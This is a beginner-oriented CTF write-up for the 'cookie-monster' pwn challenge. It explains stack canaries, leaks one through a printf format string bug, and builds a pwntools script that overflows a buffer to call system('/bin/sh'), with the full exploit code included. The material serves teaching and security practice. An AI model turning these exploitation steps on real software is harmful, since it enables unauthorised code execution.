
# Cookie-Monster

*This writeup is written with the aim of helping beginners understand simple pwn challenges with its details. For solution check `solve.py`*

## Understanding the binary and finding the overflow target

After running the checksec command, we can see that its a 32 bit binary, with stack canary and NX.

![checksec](https://i.imgur.com/tfFah81.png)

Opening the binary with Ghidra reveals a very simple program:

![ghidra-bof](https://i.imgur.com/FFQJp6u.png)

First thing that is obvious is the out of bounds write - a buffer of 32 bytes is reserved but size parameter that is passed to the fgets allows for a 0x40h (64d) byte write, overflowing by 32 bytes.

![bof-target](https://i.imgur.com/jDWz7k9.png)

However, stack cookie is enabled, which means any significant overflow will lead to stack smashing error and aborting execution.

![stack-smashing](https://i.imgur.com/gPSeD69.png)

## What is stack cookie (AKA stack canary)
Stack cookie or canary is a random 4 or 8 byte number that is generated during the runtime. Before every return address in the stack, this cookie is placed and then checked against the generated value.


Goal of the stack cookie is to see if those bytes are overwritten with something else, and if overwritten, it aborts the execution before an overwritten return pointer can be used. 

## Defeating stack cookie

To defeat the stack cookie, we have to leak it somehow, and when we overflow something on the stack, we have to make sure we overwrite the stack cookie back with its original value rather than with junk.

Lucky for us, we have a method of leaking the stack canary in this program.

![canary-leak](https://i.imgur.com/f2vhSct.png)

A printf function is directly taking user arguement, allowing users to leak information by using format control characters (such as %s %d %x) and leaking information.

![format-string-bug](https://i.imgur.com/xWzw2yE.png)

For comparison, 

correct method:
`printf("%s", local_30);`

wrong method:
`printf(local_30)`


## Understanding and abusing format string bugs

By calculating the distance of the stack cookie from the stack pointer, we can leak the value of our stack cookie.

First, we start by running the binary in debugger (gdb ./cookie-monster), and breaking on printf instruction with the format string bug.

![gdb-break](https://i.imgur.com/5m2Fubk.png)

In the debugger, running the `canary` command will reveal all addresses with the stack cookie, and running `telescope` command will show the stack content.

![telescope](https://i.imgur.com/0s9h3ev.png)

From here, we can see that the closest stack cookie is 15 pointers away to the $esp, which is the top of the stack.

From now on, to dump the stack cookie, we can enter our name as: `%15$p`.

Dumped value:

![canary-leak](https://i.imgur.com/iKmIS3r.png)

canary:

![canary-leak-2](https://i.imgur.com/klj3lpH.png)

**Success!**

## Exploit strategy

Now that we have the bof and the canary leak, we have everything we need to overwrite the return pointer, and set the $EIP register to redirect execution flow.

Now, we just need the gadget.
Lucky for us, program calls `system` function and if we can somehow set its parameter and return to the instruction its called, we can get the server to run our command.

Looking at the assembly of that part, its easy to see how parameter is passed into the `system` function.

![system-call](https://i.imgur.com/ASahkry.png)

"cat cookies" string is loaded into EAX register, then pushed to the stack. Which means system function reads the next pointer from stack for its parameter. Easy enough to exploit. 

We just need to find a good string (preferably `/bin/sh` or `sh`)

Fortunately we have a `/bin/sh\x00` in the binary, so we can use that.

![sh](https://i.imgur.com/MepXGZg.png)

## Exploit development

Now that we have a working canary leak, we can start working on our exploit.

As usual we start by importing pwntools and starting the process. We also add the ELF file as it might be useful later.

setting the context to debug helps us with the development as it shows the I/O with the process.


```py
from pwn import *

p = process("./cookie-monster")
b = ELF("./cookie-monster")

context.log_level = "debug"
```

We start by receiving until it asks our name, and sending our payload to leak stack cookie.

```py
a = p.recvuntil(":") # Enter your name:
print("[!] recvd: ", a)

p.sendline("%15$p") # canary = $esp-15*4
```

Then, we need to parse out the stack canary from the response:
```py
resp = p.recvline() # Hello 0xabcdef

## Hello 0xabcdef
## 123456789abcde > canary starts on 9th char
canary_xstr = resp[9:]
print(canary_xstr)

# read as hex integer
canary = int(canary_xstr,16)
print(canary)
log.info("Canary: {}".format(hex(canary)))
```

Now that we have the canary leak, we have to receive output from the process until it asks us: `What would you like to purchase?`

```py
p.recvuntil("?")
```

Now that we are at the overflow part, we need to set our payload up.

We'll need the `/bin/sh` string we found earlier, so we can use the ELF.search function to find its address.

```py
sh = next(b.search(b"/bin/sh"))
```


Running the program until stack smash check and viewing the stack via `telescope` command, we can calculate the offsets we need.

![smash](https://i.imgur.com/N1Re4GP.png)

We can see tht our stack canary is 32 bytes after where our write starts. Additionally, $EBP register which contains the base pointer for our return is set at the value 12 bytes under our stack canary.
![smash-offset](https://i.imgur.com/tpC7W6a.png)

Which means, we need 32 bytes of junk to fill the buffer, then our canary, then 12 more bytes of junk to overwrite our return pointer.

Then we can overwrite it with the address where system call happens, and have the pointer to our `/bin/sh` string so its passed as a parameter to the `system()`

```py
pld = b"A"*32           # pad choice buffer
pld += p32(canary) 
pld += b"B"*12          # pad junk until system parameter
pld += p32(0x804860c)   # system call @ bakery
pld += p32(sh)          # /bin/sh string 

p.sendline(pld)
p.interactive()
```


## Full exploit

```py
from pwn import *

p = process("./cookie-monster")
#p = remote("chals.damctf.xyz", 31312)
b = ELF("./cookie-monster")

sh = next(b.search(b"/bin/sh"))
print(f"sh: {hex(sh)}")

context.log_level = "debug"
libc = b.libc

a = p.recvuntil(":") # Enter your name:
print("[!] recvd: ", a)

p.sendline("%15$p") # $esp-15*8 = canary

resp = p.recvline() # Hello 0xabcdef

## Hello 0xabcdef
## 123456789abcde > canary starts on 9th char
canary_xstr = resp[9:]
print(canary_xstr)

# read as hex integer
canary = int(canary_xstr,16)
print(canary)
log.info("Canary: {}".format(hex(canary)))

p.recvuntil("?")


pld = b"A"*32 # pad choice buffer
pld += p32(canary) 
pld += b"B"*12          # pad junk until system parameter
pld += p32(0x804860c)   # system call @ bakery
pld += p32(sh)          # /bin/sh string 

p.sendline(pld)
p.interactive()
```

